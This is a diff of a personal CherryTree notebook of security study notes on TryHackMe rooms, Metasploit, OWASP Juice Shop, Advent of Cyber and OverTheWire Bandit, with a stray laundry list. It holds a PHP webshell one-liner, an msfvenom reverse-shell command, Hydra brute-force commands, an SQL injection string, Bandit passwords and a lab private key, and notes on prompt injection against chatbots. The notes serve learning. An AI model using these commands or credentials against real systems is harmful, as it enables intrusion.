@@ -1,7 +1,19 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="devops" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#1e90ff" ts_creation="1619462339" ts_lastsave="1694987488">
+  <node name="devops" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#1e90ff" ts_creation="1619462339" ts_lastsave="1700673736">
+    <rich_text>sacar guardapeluzas y limpiarlos
+se separa la ropa en obscura y blanca
+blanca con claros
+primero va la blanca, chorro de vinagre, cucharada de vanish, chorro de clorox morado y tapa de jabon foca liquido
+    suavitel cuando termine lavado, una tapa
+negra, chorro de vinagre menos grande, 2 tapas de jabon liquido mas color negro y poquito jabon en polvo foca
+    dos tapas de suavitel cuando las pida
+
+calzones de leo y fany a mano
+playeras amarillas con la blanca y sueter del diario
+
+dansing.for.love@gmail.com</rich_text>
     <node name="Curso de cloud computing" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1619531922" ts_lastsave="1649170170">
       <rich_text># Que es EC2
 - son practicamente maquinas virtuales
@@ -6960,7 +6972,157 @@ basic terms
     </node>
     <node name="Servidores web" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694987488" ts_lastsave="1694987488"/>
   </node>
-  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1698636581">
+  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1704850228">
+    <rich_text>good url:
+
+TO CHECK VULNERABILITIES
+</rich_text>
+    <rich_text link="webs https://www.exploit-db.com/">https://www.exploit-db.com/</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://nvd.nist.gov/vuln/search">https://nvd.nist.gov/vuln/search</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://cve.mitre.org/">https://cve.mitre.org/</rich_text>
+    <rich_text>
+
+
+
+</rich_text>
+    <rich_text scale="h2">Your Cleverbridge reference number: 431182666</rich_text>
+    <rich_text>
+</rich_text>
+    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="1700447328" ts_lastsave="1703107505">
+      <node name="Introductory Networking" unique_id="193" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700447369" ts_lastsave="1700527383">
+        <rich_text>OSI Model
+- Application
+- Presentation
+- Session
+- Transport
+- Network
+- Data Link
+- Physical
+
+ping use of ICMP protocol, work in network layer of OSI model, internet layer on TCP/IP model
+traceroute map the path request, in win use ICMP and unix-like us UDP
+WHOIS, query who a domain name is registered to
+DIG, </rich_text>
+      </node>
+      <node name="Nmap" unique_id="194" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="1" foreground="" ts_creation="1700602042" ts_lastsave="1700675991">
+        <rich_text>knowledge is power, we need to establisj which services are running on the targets
+depending of port is probably get the service running in the server
+nmap is used to perform many different kinds of port scan
+nmap running on terminal
+
+scan basic types
+- TCP connect scan -sT
+- SYN “half-open” scan -sS
+- UDP scans -sU
+- TCP Null scans -sN
+- TCP FUN scans -sF
+- TCP Xmas scans -sX
+
+-sT, three-way handshake, connect terminal, sends a TCP request with SYN flag and TCP response with SYN flag, as wee as the ACK flag
+request with SYN flag set to closed, server respond with a TCP packet with RST flag
+with a simple drop incoming packets (nothing back) firewall is configured
+
+-sS, used to port-range, referred as half-open or stealth, SYN sends back a RST TCP packetafter receiving SYN/ACK
+advantages:
+- bypass older intrusion detection sustems
+- SYN scans are often not logged by application listening on open ports
+- this is significantly faster than a standard TCP connect scan
+Disadventages:
+- require sudo permission, permission of create raw packets
+- unstable services are sometimes brought down by SYN scans
+This is a default scans used by nmap
+
+UDP scans
+stateless connections, connection with a back-and-forth handshake, the lack of acknowledgement makes UDP significantly more difficult
+use of -sU
+to open port there should be no response, states: open|filtered, but is possible that the port is open or firewalled
+when port is closed this should respond an ICMP packet
+good practice use: --top-ports &lt;number&gt;
+nmap sends empty requests, raw UDP packets
+
+NULL, FIN and Xmas
+less commonly used
+NULL, -sN, TCP request is sent with no flags, should respond with RST if the port is closed
+FIN scans, -sF, sending complety empty packet, use with FIN flag, expects a RST if port is closed
+Xmas scans, -sX, send a malformed TCP packet and expects a RST response for closed ports, flags: PSH, URG and FIN
+this only detects open|filtered, closed or filtered, response ICMP unreachable packets
+microsoft windows and lot of Cisco network response RST to any malformed TPC packet
+
+ICMP networking Scanning
+- firts objective is obtain map of the network structure, ips with active hosts
+- ping sweep, this send ICMP to each possible IP
+- to use: -sn with a range of IP, nmap -sn 192.168.0.1-254 or nmap -sn 192.168.0.0/24</rich_text>
+      </node>
+      <node name="Network Services" unique_id="195" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700952467" ts_lastsave="1703032458">
+        <rich_text>SMB
+- server message block protocol, used for sharing access to files, printest, serial ports and other resources
+- response-request protocol, transmit multiple message between the client and server
+- connect with NetBIOS over TCP/IP, NetBEUI or IPX/SPX
+- before connection is possible use commands
+- from 95 windows support SMB, in linux use Samba
+- use of enumeration to find potential attack vectors
+- is a good point of begin to get information about network and services
+- use of enum4linux
+
+TELNET
+- application protocol to connect and execute commands
+- this send messages in clear text
+- this was replaced by ssh
+- to connect : `telnet ip port`
+- types of exploiting:
+   → breakdown, poorly hidden telnet service, marked as backdoor, get the username
+   → reverse shell, shell to communicate back to the attacking machine
+
+FTP
+- protocol to transfer files over network
+- uses client-server model
+- operates two channels:
+   → a command channel or control
+   → a data channel
+- while session is open the client may execute FTP commands
+- active, this ioen a port and listens
+- passive, the server opens a port and listens and the client connects to it
+- Types of exploits
+   → command and channels are unencrypted
+   → use of man in the middle attack
+   → ARP poisoning
+   → Breakdown, ftp is running in the server, we have a possible username'
+   → Hydra, online password cracking tool, use of dictionary for 50 protocols
+   → use of hydra: hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV ip protocol
+
+NFS
+- Netwok file system, share files and directories
+- this mount a partion of filesystem
+- ths client request to mount a directory from a remote host on a local directory
+- this connect bu RPC
+- server check if user has permission to mount
+- use of nfs-common
+- common use to escalate privileges
+- root_squash is used to avoid connections by root
+- common use of SUID bit set to execute commands with anther permissions
+
+SMTP
+- Simple Mail transfer Protocol
+- used to send emails
+- functions:
+   → verified who is sending
+   → sends the outgoing mail
+   → if not is possible outgoing it sends te message back
+- POP is mor simple, only download from the mail server
+- SMTP syncrhonise the current inbox
+- default port: 25
+
+MySQL
+- relational database based in sql
+- persistent, organised collection of structured data
+- is only brand name for one of the most popular RDBMS software implementations</rich_text>
+      </node>
+      <node name="OWASP Juice Shop" unique_id="221" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703107505" ts_lastsave="1703107505"/>
+    </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
       <rich_text>6 levels:
 - Hash Values (Trivial)
@@ -7738,7 +7900,7 @@ detailed information about process creation, network connection and changes to f
 convert os in relational database
 is like sqlite</rich_text>
     </node>
-    <node name="Wazuh" unique_id="184" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696906198" ts_lastsave="1696906469">
+    <node name="Wazuh" unique_id="184" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696906198" ts_lastsave="1699814792">
       <rich_text>is a EDR (endpoint detection and response), series of tools and applications that monitor devices for an activity
 fetures:
 - auditing a device for common vulnerabilities
@@ -7747,7 +7909,20 @@ fetures:
 - recording a device's normal operating behaviour to help with detecting anomalies
 
 created in 2015 is an open-source
-device called agent</rich_text>
+device called agent
+
+Wazuh agents
+devices that record the events and preocesses of a system are called agents
+monitor the processes and events
+needs:
+	operating system
+	address of the wazuh server to send logs
+	which group is added agent
+	
+Policy auditing
+this save metrics using multiple framworks and legislations such as NIST, MITRE and GDPR
+
+for windows this is sysmon tool</rich_text>
     </node>
     <node name="Zeek" unique_id="174" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693767420" ts_lastsave="1693850742">
       <rich_text>open source and commercial network monitoring tool
@@ -8124,13 +8299,46 @@ API SECURITY -------
 - Insufficient Logging &amp; Monitoring
    → there is not anough evidence available due to the absence of logging and monitoring mechanims</rich_text>
     </node>
+    <node name="OWASP Juice" unique_id="239" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704510132" ts_lastsave="1704518313">
+      <rich_text>Inject the juice
+- vulnerabilities are very dangerous, injection
+- downtime or loss of data
+- exist multiple types of injections attacks, some of them are:
+   → SQL Injection, enters a maliciuos or malformed query to either retrieve or tamper data from a database
+   → Command Injection, web application take input or user-controlled dataand run them as system command
+   → Email Injection, allows malicious user to send email messages without prior authorization by the email server
+- use of SQL INJECTION:
+   → common use of “‘ or 1=1 --”
+
+who broke my lock
+- exploiting authentication through different flaws
+- mechanism that are vulnerable to manipulation
+   → weak password in high privileged accounts
+   → forgotten password pages
+
+Ah! Don't look!
+- should store and transmit sensitive data safely and securely
+- bypass called "Poison Null Byte” like %00
+- using: %2500
+
+Who's flying this thing?
+- when broken access control exploits or bugs are found, it wil be categorised into one of two types
+   → Horizontal privilege escalation, occurs when a user can perform an action or access data of another data of another user with the same level of permissions
+   → Vertical privilege escalation, occurs when a user can perform an action or access data of another user with a higher level of permissions
+
+Where dud that come from
+- XSS or cross-site scripting is a vulnerability that allows attackers to run javascript in web applications
+- major types of XSS:
+   → DOM XSS, uses the HTML environment to execute malicius javascript, this use script tag
+   → Persistent XSS, is JS that is run when the server loads the page containing it, server does not sanitise the user data when it is uploaded to a page, use on blog posts
+   → Reflected XSS, JS that is run on the client-side end of the web application, these are most commonly found when the server doesn't sanitise search data</rich_text>
+    </node>
     <node name="SAST" unique_id="173" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693355854" ts_lastsave="1693355859">
       <rich_text>Automatization of testing for code analysis</rich_text>
     </node>
     <node name="Eternal Blue" unique_id="181" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696303470" ts_lastsave="1696303477">
       <rich_text>Scan and learn what exploit this machine is vulnerable to</rich_text>
     </node>
-    <node name="NMAP" unique_id="182" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696303602" ts_lastsave="1696303602"/>
     <node name="Shells" unique_id="188" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1698636581" ts_lastsave="1699293931">
       <rich_text>shell is used with CLI, bash and sh are examples of shell
 
@@ -8233,6 +8441,1663 @@ Webshell
 - exists web servers with opportunities to use like webshells, common with PHP or ASP
 - basic webshell: &lt;?php echo “&lt;pre&gt;” . shell_exec($_GET["cmd"]) . “&lt;/pre&gt;”; ?&gt;
 - </rich_text>
+    </node>
+    <node name="Metaspoit" unique_id="196" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701365847" ts_lastsave="1702060340">
+      <node name="Introduction" unique_id="197" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701365862" ts_lastsave="1701369332">
+        <rich_text>INTRODUCTION
+exploit framework
+support all phases of a penetration testing
+two versions:
+    Pro: commercial version, with automation and management of task with GUI
+    Framework: open source version works like CLI
+is a set of tools of, information gatering, scanning, exploiting, exploit development, post explotion and more
+primary action is penetration testing
+
+main components:
+    msfconsole: main CLI
+    modules: exploits, scanners, payload and more
+    tools: stand alone tools, like msfvenom, pattern_create and pattern_offset
+    
+COMPONENTS
+main concepts:
+    Exploits: piece of code that use vulnerabilities on the target
+    Vulnerability: desing code or logic flawaffecting the target system to get information or execute code in the target
+    Payload: take advantage of a vulnerability
+
+
+MSFCONSOLE
+to execute: sudo msfconsole
+regular cli shell
+commands:
+    ls, to see files where is launched
+    is possible use the mayority of commands of linux
+    use exploit/windows/smb/ms17_010_eternalblue, exploit to smb in windows
+    show options
+    back, return to previous console
+    search to fing modules in database
+    search type:auxiliary telnet
+    
+meterpreter to payload
+set to set variables, unset to delete, unset all used to delete all
+setg is used to set variable in all modules, unsetg to delete in all modules
+exploit -z run eht exploit and background the session
+if is successfully exploited a session will be created
+sessions to show sessions
+session -i interact with any session
+</rich_text>
+      </node>
+      <node name="Explotation" unique_id="198" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701570666" ts_lastsave="1701896988">
+        <rich_text>Metasploit for vulnerability scanning and explotation
+how to database features makes easy penetration testing
+generate of payload with msfvenom
+
+PORT SCANNING
+- use of command: `search portscan`
+- is possible execute nmap from msfconsole
+- is possible check ports of UDP with scanner/discovery/udp_sweep
+- use scanner/smb/smb_version to run under smb
+
+METASPLOIT DATABASE
+- use generally form several targets
+- is necesary use pg database
+- start with msfdb init
+- db_status
+- workspace, to create new workspace, using -a to add new workspace or -d to delete
+- db_nmap to save results in database
+- show results with: hosts and services
+
+VULNERABILITY SCANNING
+- low hanging friut, easily identifiable and exploitable vulnerabilities, generally high-level privileges 
+
+Explotation
+- exploits are the most popular module category
+- is possible search using `search` command, more information using `info` launching `exploit`
+- this is easy but depends on the knowledges of service running on the target system
+- most of exploits will have a preset default payload, to see use `show payloads`
+- `set payload` to select
+- `show options` to show what parameters are necesaries
+- using `CTRL + Z` to run in background and `CTRL + C` to abort
+
+MSFVENOM
+- this replace msfpayload and msfencode to generate payloads
+- this allow access of payloads available in Metasploit, is possible create custom payloads in many formats and for many differente target systems
+- use
+   → msfvenom -l payloads
+- encoders do not aim to bypass antivirus installed, this encoded the payload, use of ofuscations techniques or learning methods to inject shellcode
+- encoders use -e parameter to create: `msfvenom -p php/meterpreter/reverse_ctp LHOST={host} -f raw -e php/base64` 
+- handlers
+   → similar to exploits using a reverse shells
+   → used with msfvenom
+   → this manage by the exploit module
+- Other payloads
+   → based in the OS, webserver or interpreter, is possible create multiple formats
+   → with -f elf to create unix binaries
+   → -f exe to windows
+   → -f raw to lang
+   → -f asp to ASP</rich_text>
+      </node>
+      <node name="Meterpreter" unique_id="208" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702060340" ts_lastsave="1702268432">
+        <rich_text>Introduction
+- metasploit payload, supports penetration testing process with many values components
+- run on the target system and act as an agent, used like C2
+- runs on the target system but is not installed on it
+- runs in ram to avoid being detected during antivirus scans
+- it is avoid by IPS and IDS solutions using encrypted communication with server
+- meterpreter is ghost with another name, for example spoolsv.exe
+
+Flavors
+- two categories
+   → inline or single, 
+   → staged, send in two steps, first installed and before requests the rest of the payload
+- too depending of target system
+- in another words:
+   → the target operating system
+   → components available on the target system (Python, PHP...)
+   → Network connection types you can have with the target system
+
+Commands
+- every version of meterpreter will have different command options
+- three categories of tools:
+   → Built-in commands
+   → Meterpreter tools
+   → Meterpreter scripting
+- in help command:
+   → Core
+   → File system
+   → Networking
+   → System
+   → User interface
+   → Webcam
+   → Audio output
+   → Elevate
+   → Password database
+   → Timestomp
+</rich_text>
+      </node>
+    </node>
+    <node name="bandit" unique_id="191" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="1" foreground="" ts_creation="1700199042" ts_lastsave="1704004427">
+      <rich_text>ssh bandit.labs.overthewire.org -p 2220
+
+solutions:
+- 0: bandit0: bandit0
+- 1: bandit1: NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
+- 2: bandit2: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi, to read files with - use `cat &lt;-`
+- 3: bandit3: aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG, to read files with spaces used \
+- 4: bandit4: 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
+- 5: bandit5: lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR, to read all files with cat -- *
+- 6: bandit6: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU, to find files using size: find . -size {#}
+- 7: bandit7: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S, to search by user and group and only show permission access: `find / -size 33c -group bandit6 -user bandit7 2&gt;&amp;1 | grep -v 'Permission denied'`
+- 8: bandit8: TESKZC0XvTetK0S9xNwm25STk5iWrBvP, use of grep to search a word in file
+- 9: bandit9: EN632PlfYiZbn3PhVK3XOGSlNInNE00t, to search by number of occurencies: cat data.txt | sort | uniq -c | sort -r | head
+- 10: bandit10: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s, to read binary files: strings {file} | grep
+- 11: bandit11: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
+- 12: bandit12: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv, to rotate 13: cat data.txt | tr '[a-z]' '[n-za-m]' | tr '[A-Z]' '[N-ZA-M]'
+- 13: bandit13: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw, to decompress and get file: cat data.txt | xxd -r &gt; data
+- 14: bandit14: fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq, use of ssh
+- 15: bandit15: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt, connect and send data: echo "fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq" | nc localhost 30000
+- 16: bandit16: JQttfApK4SeyHwDlI9SXGR50qclOAil1, connect and send data: echo jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt | openssl s_client -connect localhost:30001 -ign_eof
+- 17: bandit17: 
+“”"
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+“”", to resolve this, first: nmap -p 31000-32000 -T4 localhost --script ssl-cert,ssl-enum-ciphers, and: echo "JQttfApK4SeyHwDlI9SXGR50qclOAil1" | openssl s_client -connect localhost:31790 -ign_eof, this get a rsa certificate
+- 18: bandit18: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg, resolve: diff passwords.new passwords.old
+- 19: bandit19: awhqfNnAbc1naukrpqDYcF95h7HoMTrC, use `ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'`
+- 20: bandit20: VxCazJaVykI6W36BkBU0mJTCM8rR95XT, `./bandit20-do cat /etc/bandit_pass/bandit20`
+- 21: bandit21: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq, primero se debe de abrir comunicacion “echo VxCazJaVykI6W36BkBU0mJTCM8rR95XT | nc -l -p 1234 &amp;” y se ejecuta el programa con el puerto asignado
+- 22: bandit22: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff, check /etc/cron.d/cronjob_bandit22, check before what is the bash to run and ls -la to see the file and in what file is saved the password
+- 23: bandit23: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G, see cron `cronjob_bandit23` cat to script in cronjob, and execute commands using name bandit23
+- 24: bandit24: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar, create script to read pasword in /etc/bandit_pass/ and save content in /tmp/. , use of cat in bash script
+- 25: bandit25: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d, using for i in {9001..9018}; do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" &gt;&gt; reoptions01.txt; done and before cat reoptions01.txt | nc localhost 30002 &gt; bfre01.txt, part by batches with 0000..9999 breaks connection
+- 26: bandit26: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1, this level is complicated, is necessary activate more in ssh conection without use of `| more`, and using v to checkout to vim, use :r /etc/bandit_pass/bandit26
+- 27: bandit27: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS, using the same trick in bandit26 with ssh and smallest terminal with more, use: `vi mode of cat`, `:set shell /bin/bash` and execute `:shell`, execute binary with cat command to /etc/bandit_pass/bandit27
+- 28: bandit28: AVanL161y9rsbcJIsFHuw35rjaOM19nR, create a temp dir, and clone repo adding port 2220 to url, cat to README file
+- 29: bandit29: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S, create temp dir, clone repo using port 2220, execute git log to get previous commit, change to previous commit: `git checkout {commit}`, and cat to README
+- 30: bandit30: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS, create temp dir and clone repo, check all branchs, and change to dev, cat to REAME
+- 31: bandit31: OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt, create temp dir and clone repo, check in tags and execute: `git show secret`
+- 32: bandit32: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y, create temp dir and clone repo, create file key.txt and modify the .gitignore, push to master and this return the password
+- 33: bandit33: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy, to get password use $0 to execute shell, in shell open check `whoami`, and get file of password</rich_text>
+    </node>
+    <node name="sadservers" unique_id="231" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1704004991" ts_lastsave="1704004995"/>
+    <node name="natas" unique_id="230" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1704004410" ts_lastsave="1704004437"/>
+    <node name="advent of cyber" unique_id="199" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701640955" ts_lastsave="1703454446">
+      <node name="day 1" unique_id="200" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701640961" ts_lastsave="1701640964">
+        <rich_text>Aprender sobre procesamiento de lenguaje natural
+aprender sobre inyeccion prompt
+aprender como defenderse contra ataques de inyeccion prompt
+
+un ataque de prompt inyection es manipular un chatbot, insertando ciertas peticiones
+es como un ataque de ingenieria social pero contra un chatbot
+
+los “problemas” generales de este tipo son debidos que se usan toneladas de texto para entrenar a la IA, dependiendo de la calidad es la respuesta del chatbot
+una solucion para evitar esto es remover los datos sencibles de los datasets, aunque no es tan eficiente como pareciera, para esto se deben agregar medidas de seguridad
+para la evasion de estos ataques se podria entrenar otra IA que interfiera los mensajes maliciosos</rich_text>
+      </node>
+      <node name="day 2" unique_id="201" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701652991" ts_lastsave="1701653873">
+        <rich_text>Log Analysis
+- introduccion a la ciencia de datos y como puede ser usada en ciberseguridad
+- ligera introduccion a python
+- como trabajan pandas y Matplotlib para datos
+- entender como es la red
+
+Data science:
+- el principal elemento es interpretar la data para responder preguntas, se hace uso de programacion, estadistica y recientemente de IA.
+- los roles y responsabilidades de un data scientist son:
+   → Data collection, se busca data cruda
+   → Data processing, se procesa la data cruda dentro de un formato estandar, esta sirve para poder analizar
+   → Data mining (clusterizacion/clasificacion), se crean relaciones entre los datos, busqueda de patrones y correlaciones
+   → Analysis (exploracion/confirmacion), aqui se exploran los datos para responder preguntas y algunas proyecciones futuras
+   → Comunicacion (Visualizacion), se muestran los resultados obtenidos por medio de graficas
+
+En ciber seguridad se usa para deteccion de anomalias asi como para:
+- SIEM: colecciona y relaciona grande sumas de datos
+- Threat trend analysis: las amenazas pueden ser buscadas y entenedidas
+- Predective analysis: sirve para la prevencion de futuros incidentes</rich_text>
+      </node>
+      <node name="day 3" unique_id="202" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701711779" ts_lastsave="1701717368">
+        <rich_text>objetivos
+- complejiodad de password y posibles combinaciones
+- como la combinaciones de fuerza bruta pueden afectar
+- generacion de passwords usando crunch
+- intentar passwords usando hydra
+
+factibilidad de fuerza bruta
+- cuantos Pins se pueden tener
+- cuantos passwords diferentes se peuden generar
+- que tanto tiempo toma buscar un password por fuerza bruta
+
+Contando codigos Pin
+se pueden tener un total de 10000 pines diferentes, esto suponiendo que hay 4 diferentes numeros a combinar
+
+Contando los passwords
+esto dependera del numero de combinaciones y caracteres que podamos tener, por ejemplo
+    Al tener 10 digitos numericos, 26 letras minusculas y 26 mayusculas se tiene un total de 14,776,336 combianciones solo eligiendo uno de cada uno
+    
+Que tanto se puede t ardar un atque de fuerza bruta
+esto dependera de cuantos password se pueden usar por segundo
+algo mas a tener en cuenta es que tan complejo es el password
+
+Generando lista de password
+- usando crunch: `crunch 3 3 0123456789ABCDEF -o 3digits.txt`
+   → el primer numero es la longitud minima
+   → el segundo es la lingitud maxima
+   → los digitos son los que seran usados para crear los passwords
+   → -o sirve para salvar los datos
+
+Usando la lista de passwords
+- el uso de Hydra es para no tener que meter los password de forma manual
+- para revisar y usarlos se requiere saber que metodo se esta usando y como amndar los datos, es como usar selenium
+- para usar hydra: `hydra -l ‘’ -P 3digits.txt -f -v {host} http-post-form “/login.php:pin=^PASS^:Access denied” -s {port}`
+   → -l ‘’ es para decir que el login name esta en blanco
+- pass: 6F5</rich_text>
+      </node>
